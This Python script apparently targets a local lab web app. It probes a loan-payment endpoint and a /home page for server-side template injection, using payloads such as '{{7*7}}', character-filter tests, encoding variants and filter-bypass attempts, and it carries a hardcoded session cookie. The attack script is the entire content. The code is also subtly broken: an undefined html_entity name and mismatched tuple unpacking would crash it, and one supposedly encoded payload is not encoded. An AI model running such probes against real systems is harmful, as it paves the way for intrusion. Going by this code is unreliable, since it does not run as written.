import requests
import urllib.parse
import time
import sys

base_url = "http://127.0.0.1:5000"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVYTgQ.zxJDgrrGBVoUrTrnwwifgdf1QW0"
cookies = {"session": session_cookie}

def safe_request(url, params=None, timeout=10):
    """Make a request with error handling"""
    try:
        resp = requests.get(url, params=params, cookies=cookies, timeout=timeout)
        return resp
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {str(e)}")
        return None

print("=" * 80)
print("JSON RENDERING MECHANISM ANALYSIS")
print("=" * 80)

# Test 1: Baseline request
print("\n[TEST 1] Baseline request to /total_loan_payments")
params = {"principal": "10000", "payment": "500", "term": "24"}
resp = safe_request(f"{base_url}/total_loan_payments", params=params)
if resp:
    print(f"Status: {resp.status_code}")
    print(f"Content-Type: {resp.headers.get('Content-Type')}")
    print(f"Response body: {resp.text}")
else:
    print("[WARNING] Request failed, skipping detailed analysis")
    sys.exit(1)

# Test 2: Character-level filtering analysis
print("\n" + "=" * 80)
print("[TEST 2] Character-level filter analysis")
print("=" * 80)

# Test individual potentially forbidden characters
suspicious_chars = ["{", "}", "%", "<", ">", "\"", "'", ";", "(", ")", "[", "]", "|", "&", "$", "!", "@", "#", "^", "*", "?", "\\"]

for char in suspicious_chars:
    print(f"\n[TEST] Character: '{char}'")
    params = {"principal": f"100{char}00", "payment": "500", "term": "24"}
    resp = safe_request(f"{base_url}/total_loan_payments", params=params)
    if resp:
        if resp.status_code == 400:
            print(f"  BLOCKED - Error: {resp.text[:100]}")
        else:
            print(f"  ALLOWED - Response: {resp.text[:100]}")
    else:
        print("  [WARNING] Request failed")

# Test 3: Template injection variations
print("\n" + "=" * 80)
print("[TEST 3] Template injection encoding variations")
print("=" * 80)

template_tests = [
    ("double_curly", "{{7*7}}"),
    ("url_encoded_single", "{{7*7}}"),
    ("url_encoded_twice", "%257B%257B7*7%257D%257D"),
    (html_entity, "&#123;&#123;7*7&#125;&#125;"),
    ("unicode_escape", "\\u007b\\u007b7*7\\u007d\\u007d"),
    ("only_one_brace", "{{7*7"),
    ("without_spaces", "{{7*7}}"),
    ("with_spaces", "{{ 7*7 }}"),
]

for test_name, payload in template_tests:
    print(f"\n[TEST] {test_name}: {payload[:50]}")
    params = {"principal": payload, "payment": "500", "term": "24"}
    resp = safe_request(f"{base_url}/total_loan_payments", params=params)
    if resp:
        print(f"  Status: {resp.status_code}")
        if resp.status_code == 400:
            print(f"  Error message: {resp.text}")
        elif resp.status_code == 200:
            print(f"  Response: {resp.text[:150]}")

# Test 4: JSON structure analysis
print("\n" + "=" * 80)
print("[TEST 4] JSON Structure Analysis")
print("=" * 80)

data_types = [
    {"principal": "10000", "description": "integer string"},
    {"principal": "10000.5", "description": "decimal string"},
    {"principal": "abc", "description": "alphabetic string"},
    {"principal": "true", "description": "boolean-like string"},
    {"principal": '"quoted"', "description": "double quoted string"},
    {"principal": "", "description": "empty string"},
]

for test in data_types:
    print(f"\n[TEST] Input: {test['description']}")
    params = {"principal": test["principal"], "payment": "500", "term": "24"}
    resp = safe_request(f"{base_url}/total_loan_payments", params=params)
    if resp and resp.status_code == 200:
        print(f"  Response: {resp.text}")
        try:
            parsed = resp.json()
            for key, value in parsed.items():
                py_type = type(value).__name__
                print(f"    {key}: '{value}' -> Python type: {py_type}")
        except:
            print("  [ERROR] Not valid JSON")

# Test 5: Comparison with /home endpoint
print("\n" + "=" * 80)
print("[TEST 5] Comparison with /home endpoint")
print("=" * 80)

print("\n[TEST] Testing /home with template")
resp_home = safe_request(f"{base_url}/home", params={"data": "{{7*7}}"})
if resp_home:
    print(f"  Status: {resp_home.status_code}")
    print(f"  Response: {resp_home.text[:200]}")
    print(f"  Contains '49': {'49' in resp_home.text}")

print("\n[TEST] Testing /total_loan_payments with same template")
resp_loan = safe_request(f"{base_url}/total_loan_payments", params={"principal": "{{7*7}}", "payment": "500", "term": "24"})
if resp_loan:
    print(f"  Status: {resp_loan.status_code}")
    if resp_loan.status_code == 400:
        print(f"  Error: {resp_loan.text}")
    else:
        print(f"  Response: {resp_loan.text[:200]}")

# Test 6: Filter bypass attempts
print("\n" + "=" * 80)
print("[TEST 6] Filter bypass techniques")
print("=" * 80)

bypass_tests = [
    ("concatenation", "{{7*7}}"),  # Already tested
    ("alternative_syntax", "{% raw %}{{7*7}}{% endraw %}"),
    ("in_comment", "<!-- {{7*7}} -->", "500", "24"),
    ("url_encoded_in_comment", "<!-- %7B%7B7*7%7D%7D -->", "500", "24"),
    ("mixed_encoding", "%7B%7B7*7%7D%7D", "500", "24"),
]

for test_name, payload, p2, p3 in bypass_tests:
    print(f"\n[TEST] Bypass: {test_name}")
    if test_name == "in_comment":
        params = {"principal": payload, "payment": p2, "term": p3}
    else:
        params = {"principal": payload, "payment": "500", "term": "24"}
    resp = safe_request(f"{base_url}/total_loan_payments", params=params)
    if resp:
        print(f"  Status: {resp.status_code}")
        if resp.status_code == 200:
            print(f"  Response: {resp.text}")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
